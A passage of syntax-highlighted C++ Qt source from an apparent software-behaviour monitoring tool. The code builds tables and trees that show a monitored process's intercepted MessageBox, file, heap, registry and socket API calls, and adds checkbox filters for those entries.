class="built_in">tr</span>(<span class="string">&quot;%1&quot;</span>).<span class="built_in">arg</span>(info.<span class="built_in">size</span>())));</span><br><span class="line">	threadA.<span class="built_in">GetFileSize</span>(info.<span class="built_in">size</span>());</span><br><span class="line"></span><br><span class="line">	ui.FileInfo-&gt;<span class="built_in">setItem</span>(<span class="number">4</span>, <span class="number">0</span>, <span class="keyword">new</span> <span class="built_in">QTableWidgetItem</span>(<span class="string">&quot;Create Time&quot;</span>));</span><br><span class="line">	QDateTime time = info.<span class="built_in">created</span>();</span><br><span class="line">	ui.FileInfo-&gt;<span class="built_in">setItem</span>(<span class="number">4</span>, <span class="number">1</span>, <span class="keyword">new</span> <span class="built_in">QTableWidgetItem</span>(<span class="built_in">QString</span>(<span class="string">&quot;%1&quot;</span>).<span class="built_in">arg</span>(time.<span class="built_in">toString</span>(<span class="string">&quot;yyyy-MM-dd  hh:mm:ss&quot;</span>))));</span><br><span class="line">	ui.FileInfo-&gt;<span class="built_in">setItem</span>(<span class="number">5</span>, <span class="number">0</span>, <span class="keyword">new</span> <span class="built_in">QTableWidgetItem</span>(<span class="string">&quot;Modify  Time&quot;</span>));</span><br><span class="line">	time = info.<span class="built_in">lastModified</span>();</span><br><span class="line">	ui.FileInfo-&gt;<span class="built_in">setItem</span>(<span class="number">5</span>, <span class="number">1</span>, <span class="keyword">new</span> <span class="built_in">QTableWidgetItem</span>(<span class="built_in">QString</span>(<span class="string">&quot;%1&quot;</span>).<span class="built_in">arg</span>(time.<span class="built_in">toString</span>(<span class="string">&quot;yyyy-MM-dd  hh:mm:ss&quot;</span>))));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; row; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; column; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			ui.FileInfo-&gt;<span class="built_in">item</span>(i, j)-&gt;<span class="built_in">setTextAlignment</span>(Qt::AlignCenter | Qt::AlignHCenter);</span><br><span class="line">			ui.FileInfo-&gt;<span class="built_in">item</span>(i, j)-&gt;<span class="built_in">setFont</span>(<span class="built_in">QFont</span>(<span class="string">&quot;song&quot;</span>, <span class="number">12</span>));</span><br><span class="line">			<span class="comment">//ui.FileInfo-&gt;item(i, j)-&gt;setBackgroundColor(Qt::gray);</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::APIInfoWindow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ui.MessageBoxInfo-&gt;<span class="built_in">setColumnCount</span>(<span class="number">2</span>);</span><br><span class="line">	ui.MessageBoxInfo-&gt;<span class="built_in">setHeaderLabels</span>(<span class="built_in">QStringList</span>() &lt;&lt; <span class="string">&quot;Key&quot;</span> &lt;&lt; <span class="string">&quot;Value&quot;</span>);</span><br><span class="line"></span><br><span class="line">	ui.MessageBoxInfo-&gt;<span class="built_in">setEditTriggers</span>(QTreeView::NoEditTriggers);			<span class="comment">//单元格不能编辑</span></span><br><span class="line">	ui.MessageBoxInfo-&gt;<span class="built_in">setSelectionBehavior</span>(QTreeView::SelectRows);			<span class="comment">//一次选中整行</span></span><br><span class="line">	ui.MessageBoxInfo-&gt;<span class="built_in">setSelectionMode</span>(QTreeView::SingleSelection);        <span class="comment">//单选，配合上面的整行就是一次选单行</span></span><br><span class="line">	ui.MessageBoxInfo-&gt;<span class="built_in">setAlternatingRowColors</span>(<span class="literal">true</span>);                       <span class="comment">//每间隔一行颜色不一样，当有qss时该属性无效</span></span><br><span class="line">	ui.MessageBoxInfo-&gt;<span class="built_in">setFocusPolicy</span>(Qt::NoFocus);</span><br><span class="line">	ui.MessageBoxInfo-&gt;<span class="built_in">setColumnWidth</span>(<span class="number">0</span>, <span class="number">300</span>);</span><br><span class="line"></span><br><span class="line">	ui.MessageBoxInfo-&gt;<span class="built_in">header</span>()-&gt;<span class="built_in">setStretchLastSection</span>(<span class="literal">true</span>);               <span class="comment">//最后一列自适应宽度</span></span><br><span class="line">	ui.MessageBoxInfo-&gt;<span class="built_in">header</span>()-&gt;<span class="built_in">setDefaultAlignment</span>(Qt::AlignCenter);      <span class="comment">//列头文字默认居中对齐</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//ui.MessageBoxHeader-&gt;setText(QString::fromLocal8Bit(&quot;弹窗信息栏&quot;));</span></span><br><span class="line">	ui.FileApiInfo-&gt;<span class="built_in">setColumnCount</span>(<span class="number">2</span>);</span><br><span class="line">	ui.FileApiInfo-&gt;<span class="built_in">setHeaderLabels</span>(<span class="built_in">QStringList</span>() &lt;&lt; <span class="string">&quot;Key&quot;</span> &lt;&lt; <span class="string">&quot;Value&quot;</span>);</span><br><span class="line">	ui.FileApiInfo-&gt;<span class="built_in">setEditTriggers</span>(QTreeView::NoEditTriggers);			<span class="comment">//单元格不能编辑</span></span><br><span class="line">	ui.FileApiInfo-&gt;<span class="built_in">setSelectionBehavior</span>(QTreeView::SelectRows);			<span class="comment">//一次选中整行</span></span><br><span class="line">	ui.FileApiInfo-&gt;<span class="built_in">setSelectionMode</span>(QTreeView::SingleSelection);        <span class="comment">//单选，配合上面的整行就是一次选单行</span></span><br><span class="line">	ui.FileApiInfo-&gt;<span class="built_in">setAlternatingRowColors</span>(<span class="literal">true</span>);                       <span class="comment">//每间隔一行颜色不一样，当有qss时该属性无效</span></span><br><span class="line">	ui.FileApiInfo-&gt;<span class="built_in">setFocusPolicy</span>(Qt::NoFocus);</span><br><span class="line">	ui.FileApiInfo-&gt;<span class="built_in">setColumnWidth</span>(<span class="number">0</span>, <span class="number">300</span>);</span><br><span class="line">	ui.FileApiInfo-&gt;<span class="built_in">header</span>()-&gt;<span class="built_in">setStretchLastSection</span>(<span class="literal">true</span>);               <span class="comment">//最后一列自适应宽度</span></span><br><span class="line">	ui.FileApiInfo-&gt;<span class="built_in">header</span>()-&gt;<span class="built_in">setDefaultAlignment</span>(Qt::AlignCenter);      <span class="comment">//列头文字默认居中对齐</span></span><br><span class="line">	</span><br><span class="line">	ui.HeapApiInfo-&gt;<span class="built_in">setColumnCount</span>(<span class="number">2</span>);</span><br><span class="line">	ui.HeapApiInfo-&gt;<span class="built_in">setHeaderLabels</span>(<span class="built_in">QStringList</span>() &lt;&lt; <span class="string">&quot;Key&quot;</span> &lt;&lt; <span class="string">&quot;Value&quot;</span>);</span><br><span class="line">	ui.HeapApiInfo-&gt;<span class="built_in">setEditTriggers</span>(QTreeView::NoEditTriggers);			<span class="comment">//单元格不能编辑</span></span><br><span class="line">	ui.HeapApiInfo-&gt;<span class="built_in">setSelectionBehavior</span>(QTreeView::SelectRows);			<span class="comment">//一次选中整行</span></span><br><span class="line">	ui.HeapApiInfo-&gt;<span class="built_in">setSelectionMode</span>(QTreeView::SingleSelection);        <span class="comment">//单选，配合上面的整行就是一次选单行</span></span><br><span class="line">	ui.HeapApiInfo-&gt;<span class="built_in">setAlternatingRowColors</span>(<span class="literal">true</span>);                       <span class="comment">//每间隔一行颜色不一样，当有qss时该属性无效</span></span><br><span class="line">	ui.HeapApiInfo-&gt;<span class="built_in">setFocusPolicy</span>(Qt::NoFocus);</span><br><span class="line">	ui.HeapApiInfo-&gt;<span class="built_in">setColumnWidth</span>(<span class="number">0</span>, <span class="number">300</span>);</span><br><span class="line">	ui.HeapApiInfo-&gt;<span class="built_in">header</span>()-&gt;<span class="built_in">setStretchLastSection</span>(<span class="literal">true</span>);               <span class="comment">//最后一列自适应宽度</span></span><br><span class="line">	ui.HeapApiInfo-&gt;<span class="built_in">header</span>()-&gt;<span class="built_in">setDefaultAlignment</span>(Qt::AlignCenter);      <span class="comment">//列头文字默认居中对齐</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	ui.RegApiInfo-&gt;<span class="built_in">setColumnCount</span>(<span class="number">2</span>);</span><br><span class="line">	ui.RegApiInfo-&gt;<span class="built_in">setHeaderLabels</span>(<span class="built_in">QStringList</span>() &lt;&lt; <span class="string">&quot;Key&quot;</span> &lt;&lt; <span class="string">&quot;Value&quot;</span>);</span><br><span class="line">	ui.RegApiInfo-&gt;<span class="built_in">setEditTriggers</span>(QTreeView::NoEditTriggers);			<span class="comment">//单元格不能编辑</span></span><br><span class="line">	ui.RegApiInfo-&gt;<span class="built_in">setSelectionBehavior</span>(QTreeView::SelectRows);			<span class="comment">//一次选中整行</span></span><br><span class="line">	ui.RegApiInfo-&gt;<span class="built_in">setSelectionMode</span>(QTreeView::SingleSelection);        <span class="comment">//单选，配合上面的整行就是一次选单行</span></span><br><span class="line">	ui.RegApiInfo-&gt;<span class="built_in">setAlternatingRowColors</span>(<span class="literal">true</span>);                       <span class="comment">//每间隔一行颜色不一样，当有qss时该属性无效</span></span><br><span class="line">	ui.RegApiInfo-&gt;<span class="built_in">setFocusPolicy</span>(Qt::NoFocus);</span><br><span class="line">	ui.RegApiInfo-&gt;<span class="built_in">setColumnWidth</span>(<span class="number">0</span>, <span class="number">300</span>);</span><br><span class="line">	ui.RegApiInfo-&gt;<span class="built_in">header</span>()-&gt;<span class="built_in">setStretchLastSection</span>(<span class="literal">true</span>);               <span class="comment">//最后一列自适应宽度</span></span><br><span class="line">	ui.RegApiInfo-&gt;<span class="built_in">header</span>()-&gt;<span class="built_in">setDefaultAlignment</span>(Qt::AlignCenter);      <span class="comment">//列头文字默认居中对齐</span></span><br><span class="line"></span><br><span class="line">	ui.SocketApiInfo-&gt;<span class="built_in">setColumnCount</span>(<span class="number">2</span>);</span><br><span class="line">	ui.SocketApiInfo-&gt;<span class="built_in">setHeaderLabels</span>(<span class="built_in">QStringList</span>() &lt;&lt; <span class="string">&quot;Key&quot;</span> &lt;&lt; <span class="string">&quot;Value&quot;</span>);</span><br><span class="line">	ui.SocketApiInfo-&gt;<span class="built_in">setEditTriggers</span>(QTreeView::NoEditTriggers);			<span class="comment">//单元格不能编辑</span></span><br><span class="line">	ui.SocketApiInfo-&gt;<span class="built_in">setSelectionBehavior</span>(QTreeView::SelectRows);			<span class="comment">//一次选中整行</span></span><br><span class="line">	ui.SocketApiInfo-&gt;<span class="built_in">setSelectionMode</span>(QTreeView::SingleSelection);        <span class="comment">//单选，配合上面的整行就是一次选单行</span></span><br><span class="line">	ui.SocketApiInfo-&gt;<span class="built_in">setAlternatingRowColors</span>(<span class="literal">true</span>);                       <span class="comment">//每间隔一行颜色不一样，当有qss时该属性无效</span></span><br><span class="line">	ui.SocketApiInfo-&gt;<span class="built_in">setFocusPolicy</span>(Qt::NoFocus);</span><br><span class="line">	ui.SocketApiInfo-&gt;<span class="built_in">setColumnWidth</span>(<span class="number">0</span>, <span class="number">300</span>);</span><br><span class="line">	ui.SocketApiInfo-&gt;<span class="built_in">header</span>()-&gt;<span class="built_in">setStretchLastSection</span>(<span class="literal">true</span>);               <span class="comment">//最后一列自适应宽度</span></span><br><span class="line">	ui.SocketApiInfo-&gt;<span class="built_in">header</span>()-&gt;<span class="built_in">setDefaultAlignment</span>(Qt::AlignCenter);      <span class="comment">//列头文字默认居中对齐</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::ProcessInfoTable</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> column = <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">int</span> row = <span class="number">5</span>;</span><br><span class="line">	ui.ProcessInfoTable-&gt;<span class="built_in">setColumnCount</span>(column);</span><br><span class="line">	ui.ProcessInfoTable-&gt;<span class="built_in">setRowCount</span>(row);</span><br><span class="line">	ui.ProcessInfoTable-&gt;<span class="built_in">verticalHeader</span>()-&gt;<span class="built_in">hide</span>();</span><br><span class="line">	ui.ProcessInfoTable-&gt;<span class="built_in">horizontalHeader</span>()-&gt;<span class="built_in">hide</span>();</span><br><span class="line">	ui.ProcessInfoTable-&gt;<span class="built_in">setColumnWidth</span>(<span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">	ui.ProcessInfoTable-&gt;<span class="built_in">setColumnWidth</span>(<span class="number">1</span>, <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">	ui.ProcessInfoTable-&gt;<span class="built_in">setItem</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="keyword">new</span> <span class="built_in">QTableWidgetItem</span>(QString::<span class="built_in">fromLocal8Bit</span>(<span class="string">&quot;进程信息栏&quot;</span>)));</span><br><span class="line">	ui.ProcessInfoTable-&gt;<span class="built_in">item</span>(<span class="number">0</span>, <span class="number">0</span>)-&gt;<span class="built_in">setTextAlignment</span>(Qt::AlignCenter | Qt::AlignHCenter);</span><br><span class="line">	ui.ProcessInfoTable-&gt;<span class="built_in">item</span>(<span class="number">0</span>, <span class="number">0</span>)-&gt;<span class="built_in">setBackgroundColor</span>(Qt::gray);</span><br><span class="line">	ui.ProcessInfoTable-&gt;<span class="built_in">setSpan</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	ui.ProcessInfoTable-&gt;<span class="built_in">setItem</span>(<span class="number">1</span>, <span class="number">0</span>, <span class="keyword">new</span> <span class="built_in">QTableWidgetItem</span>(<span class="string">&quot;Key&quot;</span>));</span><br><span class="line">	ui.ProcessInfoTable-&gt;<span class="built_in">setItem</span>(<span class="number">1</span>, <span class="number">1</span>, <span class="keyword">new</span> <span class="built_in">QTableWidgetItem</span>(<span class="string">&quot;Value&quot;</span>));</span><br><span class="line">	ui.ProcessInfoTable-&gt;<span class="built_in">item</span>(<span class="number">1</span>, <span class="number">0</span>)-&gt;<span class="built_in">setTextAlignment</span>(Qt::AlignCenter | Qt::AlignHCenter);</span><br><span class="line">	ui.ProcessInfoTable-&gt;<span class="built_in">item</span>(<span class="number">1</span>,<span class="number">1</span>)-&gt;<span class="built_in">setTextAlignment</span>(Qt::AlignCenter | Qt::AlignHCenter);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//进程信息窗口中Key栏</span></span><br><span class="line">	ui.ProcessInfoTable-&gt;<span class="built_in">setItem</span>(<span class="number">2</span>, <span class="number">0</span>, <span class="keyword">new</span> <span class="built_in">QTableWidgetItem</span>(QString::<span class="built_in">fromLocal8Bit</span>(<span class="string">&quot;进程名称&quot;</span>)));</span><br><span class="line">	ui.ProcessInfoTable-&gt;<span class="built_in">setItem</span>(<span class="number">3</span>, <span class="number">0</span>, <span class="keyword">new</span> <span class="built_in">QTableWidgetItem</span>(QString::<span class="built_in">fromLocal8Bit</span>(<span class="string">&quot;进程句柄&quot;</span>)));</span><br><span class="line">	ui.ProcessInfoTable-&gt;<span class="built_in">setItem</span>(<span class="number">4</span>, <span class="number">0</span>, <span class="keyword">new</span> <span class="built_in">QTableWidgetItem</span>(QString::<span class="built_in">fromLocal8Bit</span>(<span class="string">&quot;进程ID&quot;</span>)));</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; row; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		ui.ProcessInfoTable-&gt;<span class="built_in">item</span>(i, <span class="number">0</span>)-&gt;<span class="built_in">setTextAlignment</span>(Qt::AlignCenter | Qt::AlignHCenter);</span><br><span class="line">		ui.ProcessInfoTable-&gt;<span class="built_in">setItem</span>(i, <span class="number">1</span>, <span class="keyword">new</span> <span class="built_in">QTableWidgetItem</span>(<span class="string">&quot;NULL&quot;</span>));</span><br><span class="line">		ui.ProcessInfoTable-&gt;<span class="built_in">item</span>(i, <span class="number">1</span>)-&gt;<span class="built_in">setTextAlignment</span>(Qt::AlignCenter | Qt::AlignHCenter);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::on_threadA_newInfo</span><span class="params">(info tempInfo)</span><span class="comment">//往窗口中写入信息</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//从recvinfo中提取信息并创建树形结构</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//测试</span></span><br><span class="line">	<span class="comment">/*FILE* f = fopen(&quot;log.txt&quot;, &quot;a+&quot;);</span></span><br><span class="line"><span class="comment">	fprintf(f, &quot;%s:%s\n%s:%s\n%s:%s\n%s:%s\n&quot;, recvinfo.Name[0], recvinfo.Value[0], recvinfo.Name[1], recvinfo.Value[1], recvinfo.Name[2], recvinfo.Value[2], recvinfo.Name[3], recvinfo.Value[3]);</span></span><br><span class="line"><span class="comment">	fclose(f);*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//定义局部变量来接受recvinfo</span></span><br><span class="line">	<span class="comment">//info tempInfo= recvinfo;</span></span><br><span class="line">	QTreeWidgetItem* t = <span class="keyword">new</span> <span class="built_in">QTreeWidgetItem</span>();</span><br><span class="line">	t-&gt;<span class="built_in">setData</span>(<span class="number">0</span>, <span class="number">0</span>, typestr[tempInfo.type]);</span><br><span class="line">	<span class="comment">//t-&gt;setData(0, 0, &quot;TEST&quot;);</span></span><br><span class="line">	<span class="keyword">char</span> time[<span class="number">128</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="built_in">sprintf</span>(time, <span class="string">&quot;%d-%d-%d %-02d:%-02d:%-d:%-ds&quot;</span>, tempInfo.st.wYear, tempInfo.st.wMonth, tempInfo.st.wDay, tempInfo.st.wHour, tempInfo.st.wMinute, tempInfo.st.wSecond, tempInfo.st.wMilliseconds);</span><br><span class="line">	t-&gt;<span class="built_in">setData</span>(<span class="number">1</span>, <span class="number">0</span>, time);</span><br><span class="line">	t-&gt;<span class="built_in">setTextAlignment</span>(<span class="number">1</span>, Qt::AlignCenter | Qt::AlignHCenter);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; tempInfo.Num; i++)</span><br><span class="line">	&#123;<span class="comment">//遍历其所有参数进行添加</span></span><br><span class="line">		QTreeWidgetItem* item = <span class="keyword">new</span> <span class="built_in">QTreeWidgetItem</span>();</span><br><span class="line">		item-&gt;<span class="built_in">setData</span>(<span class="number">0</span>, <span class="number">0</span>, QString::<span class="built_in">fromLocal8Bit</span>(tempInfo.Name[i]));</span><br><span class="line">		item-&gt;<span class="built_in">setData</span>(<span class="number">1</span>, <span class="number">0</span>, QString::<span class="built_in">fromLocal8Bit</span>(tempInfo.Value[i]));</span><br><span class="line">		item-&gt;<span class="built_in">setTextAlignment</span>(<span class="number">0</span>,Qt::AlignCenter | Qt::AlignHCenter);</span><br><span class="line">		item-&gt;<span class="built_in">setTextAlignment</span>(<span class="number">1</span>, Qt::AlignCenter | Qt::AlignHCenter);</span><br><span class="line"></span><br><span class="line">		t-&gt;<span class="built_in">addChild</span>(item);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> temp = tempInfo.type;</span><br><span class="line">	<span class="comment">//判断是何种信息</span></span><br><span class="line">	<span class="keyword">if</span> ((temp == MESSAGEBOXA) || (temp == MESSAGEBOXW))</span><br><span class="line">	&#123;</span><br><span class="line">		ui.MessageBoxInfo-&gt;<span class="built_in">addTopLevelItem</span>(t);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>((temp==CREATEFILE)||(temp==WRITEFILE)||(temp==READFILE)|| (temp==CLOSEHANDLE)||(temp==COPYFILEA))</span><br><span class="line">	&#123;</span><br><span class="line">		ui.FileApiInfo-&gt;<span class="built_in">addTopLevelItem</span>(t);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> ((temp == HEAPCREATE)||(temp==HEAPDESTROY)||(temp==HEAPFREE)||(temp==HEAPALLOC))</span><br><span class="line">	&#123;</span><br><span class="line">		ui.HeapApiInfo-&gt;<span class="built_in">addTopLevelItem</span>(t);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> ((temp == REGCREATEKEYEX) || (temp == REGCLOSEKEY) || (temp == REGSETVALUEEX) || (temp == REGOPENKEYEX) || (temp == REGDELETEVALUE))</span><br><span class="line">	&#123;</span><br><span class="line">		ui.RegApiInfo-&gt;<span class="built_in">addTopLevelItem</span>(t);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>((temp==THESOCKET)||(temp==BIND)||(temp==SEND)||(temp==CONNECT)||(temp==RECV))</span><br><span class="line">	<span class="comment">/*else*/</span></span><br><span class="line">	&#123;<span class="comment">//test</span></span><br><span class="line">		<span class="comment">/*FILE* f = fopen(&quot;test.txt&quot;, &quot;a+&quot;);</span></span><br><span class="line"><span class="comment">		fprintf(f, &quot;%d\n&quot;, temp);</span></span><br><span class="line"><span class="comment">		fclose(f);*/</span></span><br><span class="line">		<span class="comment">//20210915  11:30无法收到recv和send的数据包</span></span><br><span class="line">		ui.SocketApiInfo-&gt;<span class="built_in">addTopLevelItem</span>(t);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::on_threadA_newProcessName</span><span class="params">(QString str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ui.ProcessInfoTable-&gt;<span class="built_in">item</span>(<span class="number">2</span>, <span class="number">1</span>)-&gt;<span class="built_in">setText</span>(str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::on_threadA_newProcessID</span><span class="params">(<span class="keyword">int</span> id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ui.ProcessInfoTable-&gt;<span class="built_in">item</span>(<span class="number">4</span>, <span class="number">1</span>)-&gt;<span class="built_in">setText</span>(QString::<span class="built_in">number</span>(id));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::on_threadA_newProcessHandle</span><span class="params">(QString str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ui.ProcessInfoTable-&gt;<span class="built_in">item</span>(<span class="number">3</span>, <span class="number">1</span>)-&gt;<span class="built_in">setText</span>(str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//关于checkbox信号变化的函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::State_MessageA</span><span class="params">(<span class="keyword">int</span> state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//test</span></span><br><span class="line">	<span class="comment">/*FILE* f = fopen(&quot;test.txt&quot;, &quot;a+&quot;);</span></span><br><span class="line"><span class="comment">	fprintf(f, &quot;成功到达槽函数！&quot;);</span></span><br><span class="line"><span class="comment">	fclose(f);*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//拿到该checkbox</span></span><br><span class="line">	<span class="comment">/*QObject* object = QObject::sender();</span></span><br><span class="line"><span class="comment">	QCheckBox* pSenderCheckBox = static_cast&lt;QCheckBox*&gt;(object);</span></span><br><span class="line"><span class="comment">	QListWidgetItem* item = MessageList-&gt;item(0);</span></span><br><span class="line"><span class="comment">	QWidget* pwidget = MessageList-&gt;itemWidget(item);</span></span><br><span class="line"><span class="comment">	QCheckBox* ckb = (QCheckBox*)pwidget;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	QTreeWidgetItemIterator it(ui.MessageBoxInfo);</span></span><br><span class="line"><span class="comment">	while (*it)</span></span><br><span class="line"><span class="comment">	&#123;</span></span><br><span class="line"><span class="comment">		if ((*it)-&gt;text(0) == &quot;MessageBoxA&quot;)</span></span><br><span class="line"><span class="comment">		&#123;</span></span><br><span class="line"><span class="comment">			if (ckb-&gt;isChecked()) &#123;</span></span><br><span class="line"><span class="comment">				(*it)-&gt;setHidden(false);</span></span><br><span class="line"><span class="comment">			&#125;</span></span><br><span class="line"><span class="comment">			else &#123;</span></span><br><span class="line"><span class="comment">				(*it)-&gt;setHidden(true);</span></span><br><span class="line"><span class="comment">			&#125;</span></span><br><span class="line"><span class="comment">		&#125;</span></span><br><span class="line"><span class="comment">		++it;</span></span><br><span class="line"><span class="comment">	&#125;*/</span></span><br><span class="line">	<span class="function">QTreeWidgetItemIterator <span class="title">it</span><span class="params">(ui.MessageBoxInfo)</span></span>;</span><br><span class="line">	<span class="keyword">while</span> (*it)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ((*it)-&gt;<span class="built_in">text</span>(<span class="number">0</span>) == <span class="string">&quot;MessageBoxA&quot;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (state == Qt::Checked)</span><br><span class="line">			&#123;</span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">false</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">true</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		++it;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">ProgressBar</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::State_MessageB</span><span class="params">(<span class="keyword">int</span> state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">QTreeWidgetItemIterator <span class="title">it</span><span class="params">(ui.MessageBoxInfo)</span></span>;</span><br><span class="line">	<span class="keyword">while</span> (*it)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ((*it)-&gt;<span class="built_in">text</span>(<span class="number">0</span>) == <span class="string">&quot;MessageBoxW&quot;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (state==Qt::Checked) &#123;</span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">false</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">true</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		++it;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">ProgressBar</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::State_CreateFile</span><span class="params">(<span class="keyword">int</span> state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">QTreeWidgetItemIterator <span class="title">it</span><span class="params">(ui.FileApiInfo)</span></span>;</span><br><span class="line">	<span class="keyword">while</span> (*it)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ((*it)-&gt;<span class="built_in">text</span>(<span class="number">0</span>) == <span class="string">&quot;CreateFile&quot;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (state == Qt::Checked)</span><br><span class="line">			&#123;</span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">false</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">true</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		++it;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">ProgressBar</span>(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::State_WriteFile</span><span class="params">(<span class="keyword">int</span> state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">QTreeWidgetItemIterator <span class="title">it</span><span class="params">(ui.FileApiInfo)</span></span>;</span><br><span class="line">	<span class="keyword">while</span> (*it)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ((*it)-&gt;<span class="built_in">text</span>(<span class="number">0</span>) == <span class="string">&quot;WriteFile&quot;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (state == Qt::Checked)</span><br><span class="line">			&#123;</span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">false</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">true</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		++it;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">ProgressBar</span>(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::State_ReadFile</span><span class="params">(<span class="keyword">int</span> state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">QTreeWidgetItemIterator <span class="title">it</span><span class="params">(ui.FileApiInfo)</span></span>;</span><br><span class="line">	<span class="keyword">while</span> (*it)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> 